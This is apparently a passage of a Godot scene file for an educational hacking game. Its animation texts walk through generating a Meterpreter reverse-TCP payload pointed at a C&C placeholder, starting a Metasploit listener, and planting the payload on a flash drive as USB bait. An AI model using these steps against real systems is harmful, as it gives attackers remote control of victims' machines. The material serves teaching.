tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.125, 1.625)]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(2.07, 0.26)]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["This will display a table of all configurable arguments for the chosen payload"]
}

[sub_resource type="Animation" id="Animation_s614g"]
resource_name = "fileless_12"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["root@cali :~ # msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) >  set LHOST 192.168.56.102
LHOST => 192.168.56.102
msf6 exploit(multi/handler) >  set LPORT 8000
LPORT => 8000
msf6 exploit(multi/handler) > show options
Payload options (windows/meterpreter/reverse_tcp)

		  Name         Current Setting      Required       Description

		  EXITFUNC  process                     yes         Exit technique (Accepted: ' ', 
																				 seh, thr, ead, process, none)
		  LHOST       192.168.29.208         yes         The listen address (an 
																				 interface maybe specified)
		  LPORT       8000                           yes         The listen port 
"]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.15, 1.835)]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(3.305, 1.915)]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["Seems everything is right, let's try to run our listener and get ready for our next step"]
}

[sub_resource type="Animation" id="Animation_sq4em"]
resource_name = "fileless_13"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["root@cali :~ # msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) >  set LHOST 192.168.56.102
LHOST => 192.168.56.102
msf6 exploit(multi/handler) >  set LPORT 8000
LPORT => 8000
msf6 exploit(multi/handler) > show options
Payload options (windows/meterpreter/reverse_tcp)

		  Name         Current Setting      Required       Description

		  EXITFUNC  process                     yes         Exit technique (Accepted: ' ', 
																				 seh, thr, ead, process, none)
		  LHOST       192.168.29.208         yes         The listen address (an 
																				 interface maybe specified)
		  LPORT       8000                           yes         The listen port 
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.29.208:8000"]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(2.64, 0.4)]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.15, 3.635)]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["Right now our listener is ready, it's time to get the flashdrive and wait for someone to pick it up"]
}

[sub_resource type="Animation" id="Animation_rm36m"]
resource_name = "fileless_14"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.125, 0.63)]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(3.5, 0.43)]
}

[sub_resource type="Animation" id="Animation_xj15o"]
resource_name = "fileless_15"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.125, 1)]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(3.5, 0.43)]
}

[sub_resource type="Animation" id="Animation_ruw4w"]
resource_name = "fileless_16"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.125, 1.425)]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(3.5, 2.825)]
}

[sub_resource type="Animation" id="Animation_15poh"]
resource_name = "fileless_2"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["You didn’t type --platform windows, but because your payload (windows/meterpreter/reverse_tcp) is clearly for Windows, msfvenom guessed and set it to Windows automatically."]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["root@cali :~ # msfpoison -p windows/meterpreter/reverse_tcp LHOST=
<C&C Server IP Address>  LPORT=<C&C Server Port> --platform windowds 
--arch x86 -f c -o shellcode.txt

[-] No platform was selected, choosing Msf::Module::Platform::Windows 
from the payload
"]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.13, 0.845)]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(3.26, 0.41)]
}

[sub_resource type="Animation" id="Animation_o4fi6"]
resource_name = "fileless_3"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["You didn’t type --arch x86, but your chosen payload works on 32-bit (x86) systems, so msfvenom picked that for you."]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["root@cali :~ # msfpoison -p windows/meterpreter/reverse_tcp LHOST=
<C&C Server IP Address>  LPORT=<C&C Server Port> --platform windowds 
--arch x86 -f c -o shellcode.txt

[-] No platform was selected, choosing Msf::Module::Platform::Windows 
from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
"]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window:visible")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.13, 1.245)]
}
tracks/4/type = "value"
tracks/4/imported = false
tracks/4/enabled = true
tracks/4/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/4/interp = 1
tracks/4/loop_wrap = true
tracks/4/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(2.73, 0.41)]
}

[sub_resource type="Animation" id="Animation_5bo41"]
resource_name = "fileless_4"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["root@cali :~ # msfpoison -p windows/meterpreter/reverse_tcp LHOST=
<C&C Server IP Address>  LPORT=<C&C Server Port> --platform windowds 
--arch x86 -f c -o shellcode.txt

[-] No platform was selected, choosing Msf::Module::Platform::Windows 
from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Saved as: shellcode.txt"]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["Payload created, now let's host it in apache. Let's check if the file was created"]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(1.675, 0.435)]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.13, 1.64)]
}
tracks/4/type = "value"
tracks/4/imported = false
tracks/4/enabled = true
tracks/4/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window:visible")
tracks/4/interp = 1
tracks/4/loop_wrap = true
tracks/4/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}
tracks/5/type = "value"
tracks/5/imported = false
tracks/5/enabled = true
tracks/5/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/RansomwareApp:value")
tracks/5/interp = 1
tracks/5/loop_wrap = true
tracks/5/keys = {
"times": PackedFloat32Array(0, 1),
"transitions": PackedFloat32Array(1, 1),
"update": 0,
"values": [0.0, 100.0]
}
tracks/6/type = "value"
tracks/6/imported = false
tracks/6/enabled = true
tracks/6/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/VBoxContainer/Body/body_Label_Margin/body_Label:text")
tracks/6/interp = 1
tracks/6/loop_wrap = true
tracks/6/keys = {
"times": PackedFloat32Array(0, 1),
"transitions": PackedFloat32Array(1, 1),
"update": 1,
"values": ["Creating File...", "File Created!!!"]
}
tracks/7/type = "value"
tracks/7/imported = false
tracks/7/enabled = true
tracks/7/path = NodePath("Margin/Desktop/Icon6:visible")
tracks/7/interp = 1
tracks/7/loop_wrap = true
tracks/7/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/8/type = "value"
tracks/8/imported = false
tracks/8/enabled = true
tracks/8/path = NodePath("WindowsWithShellcode:visible")
tracks/8/interp = 1
tracks/8/loop_wrap = true
tracks/8/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/9/type = "value"
tracks/9/imported = false
tracks/9/enabled = true
tracks/9/path = NodePath("Fileless/HSplitContainer/HFlowContainer/Buttons/Next:visible")
tracks/9/interp = 1
tracks/9/loop_wrap = true
tracks/9/keys = {
"times": PackedFloat32Array(0, 1),
"transitions": PackedFloat32Array(1, 1),
"update": 1,
"values": [false, true]
}
tracks/10/type = "value"
tracks/10/imported = false
tracks/10/enabled = true
tracks/10/path = NodePath("Fileless/HSplitContainer/HFlowContainer/Buttons/FakeNext:visible")
tracks/10/interp = 1
tracks/10/loop_wrap = true
tracks/10/keys = {
"times": PackedFloat32Array(0, 1),
"transitions": PackedFloat32Array(1, 1),
"update": 1,
"values": [true, false]
}
tracks/11/type = "value"
tracks/11/imported = false
tracks/11/enabled = true
tracks/11/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/VBoxContainer/Header/Label:text")
tracks/11/interp = 1
tracks/11/loop_wrap = true
tracks/11/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["shellcode.txt"]
}

[sub_resource type="Animation" id="Animation_yn5m6"]
resource_name = "fileless_5"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(-0.02, 0)]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(4.035, 4.1)]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("WindowsWithShellcode:visible")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless:visible")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}
tracks/4/type = "value"
tracks/4/imported = false
tracks/4/enabled = true
tracks/4/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window:visible")
tracks/4/interp = 1
tracks/4/loop_wrap = true
tracks/4/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/5/type = "value"
tracks/5/imported = false
tracks/5/enabled = true
tracks/5/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/5/interp = 1
tracks/5/loop_wrap = true
tracks/5/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [""]
}
tracks/6/type = "value"
tracks/6/imported = false
tracks/6/enabled = true
tracks/6/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/6/interp = 1
tracks/6/loop_wrap = true
tracks/6/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["Now we need to setup our listener"]
}

[sub_resource type="Animation" id="Animation_axcpf"]
resource_name = "fileless_6"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["root@cali :~ # msfconsole"]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.13, 0.04)]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(1.37, 0.23)]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["Let's setup our console using metasploit"]
}

[sub_resource type="Animation" id="Animation_u2gx2"]
resource_name = "fileless_7"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.13, 0.225)]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(2.405, 0.23)]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["root@cali :~ # msfconsole
msf6 > use exploit/multi/handler"]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [" This module doesn’t exploit anything — it just waits (listens) for a payload to connect back. 

 Perfect for catching a reverse_tcp payload you made with msfvenom."]
}

[sub_resource type="Animation" id="Animation_bt0j7"]
resource_name = "fileless_8"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["Matches the payload type you generated earlier — this is critical.

 If the payload you made in msfvenom is windows/meterpreter/reverse_tcp, this must be the same here"]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["root@cali :~ # msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp"]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.13, 0.425)]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(3.45, 0.42)]
}

[sub_resource type="Animation" id="Animation_uxgbj"]
resource_name = "fileless_9"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["root@cali :~ # msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) >  set LHOST 192.168.56.102
LHOST => 192.168.56.102"]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.115, 0.615)]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(2.585, 0.675)]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["This should be the IP address of your attacking machine on the same network as the target.

Must match the LHOST you used in msfvenom."]
}

[sub_resource type="Animation" id="Animation_c6f2f"]
resource_name = "fileless_datasql"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("WindowsWithShellcode/WindowContainer/SQLWindow:visible")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}

[sub_resource type="Animation" id="Animation_32id3"]
resource_name = "fileless_godot"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("WindowsWithShellcode/WindowContainer/GodotWindow:visible")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}

[sub_resource type="Animation" id="Animation_xpgrc"]
resource_name = "fileless_mydrive"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("WindowsWithShellcode/WindowContainer/move to usb:visible")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("WindowsWithShellcode/WindowContainer/move to usb/RansomwareApp:value")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0, 1),
"transitions": PackedFloat32Array(1, 1),
"update": 0,
"values": [0.0, 100.0]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("WindowsWithShellcode/WindowContainer/move to usb/VBoxContainer/Body/body_Label_Margin/body_Label:text")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0, 1),
"transitions": PackedFloat32Array(1, 1),
"update": 1,
"values": ["Copying to Flashdrive...", "Copied to Flashdrive!!!"]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("WindowsWithShellcode/WindowContainer/Label:text")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0, 1),
"transitions": PackedFloat32Array(1, 1),
"update": 1,
"values": ["", "File copied!!! Let's proceed to next step"]
}

[sub_resource type="Animation" id="Animation_dvkek"]
resource_name = "fileless_shellcode"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("WindowsWithShellcode/WindowContainer/shellcode_txt:visible")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}

[sub_resource type="Animation" id="Animation_n6wwr"]
resource_name = "fileless_show_created_file"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless:visible")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Margin:visible")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("WindowsWithShellcode:visible")
tracks/2/interp = 1
tracks/2/loop_wrap = true
